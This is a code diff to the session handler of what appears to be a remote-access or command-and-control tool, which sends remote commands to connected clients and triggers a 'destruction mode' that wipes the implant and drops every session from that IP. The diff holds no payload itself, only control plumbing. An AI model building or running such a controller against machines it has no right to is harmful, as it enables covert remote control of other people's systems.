@@ -32,7 +32,6 @@ class Session:
         self.ip_client = ip_client
         self.port_client = port_client 
         self.session_nb = session_nb
-
         
        
     def help(self):
@@ -117,9 +116,23 @@ class Session:
         mod_destruction  = "MOD_DESTRUCTION:default"
         if(CheckConn().sendsafe(self.session_nb, self.socket, mod_destruction)):
             
-            reponse = CheckConn().recvsafe(self.socket, 4096)
-            printColor("information","---->"+reponse)
-        
+            reponse = CheckConn().recvsafe(self.socket, 4096).split(SPLIT)
+            print("information---->",reponse)
+            
+            if(reponse[1] == "1" ): 
+            
+                printColor("error", "[-] An error occurred while executing the destroy mode.")
+            
+            else:
+                #not error
+                #If the destroy mode is executed then all clients with the same program name and IP address will be terminated. 
+
+                printColor("successfully","[+] The destruction mode is executed successfully.")
+                for key in Handler.dict_conn.keys():
+                    if(Handler.dict_conn[key][NB_IP] == Handler.dict_conn[self.session_nb][NB_IP]):
+                        Handler.dict_conn[key][NB_SOCKET].close()
+                        printColor("information","[-] (in session lol) Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+                        CheckConn().connexionIsDead(key) 
         else:
             printColor("error", "[+] the destruction mod was not sent.\n")
 
@@ -131,9 +144,8 @@ class Session:
     def main(self): #Main function of the class | tpl = tuple session_nb = session number
         
         printColor("help","\n[?] Run -h or --help to list the available commands.\n")
-        #while Handler.dict_conn[self.session_nb][3]: #If connexion is always connected (True)
-        checker = True
-        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True)
+        checker = True                                     #and checker why and ?
+        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker: #If connexion is always connected (True) | The checker allows to break the loop when the -b or --back argument is executed without touching a NB_ALIVE 
             terminal = str(input(str(self.ip_client)+">")).split()
             for i in range(0,len(terminal)):   
                 try:
@@ -148,7 +160,6 @@ class Session:
                     
                     elif terminal[i] == "--destruction":
                         self.lonelyDestruction()
-
 
                     elif terminal[i] == "-c":
                         self.executeCommand(terminal)
@@ -167,6 +178,4 @@ class Session:
                     #print("CHHHED")
                     #print(i)
 
-
-        printColor("information","[-] The session was cut, back to menu.") #If the session close.
-        printColor("information","[-] Back to the server menu.\n")
+        printColor("information","[-] The session was cut, back to menu.\n") #If the session close.
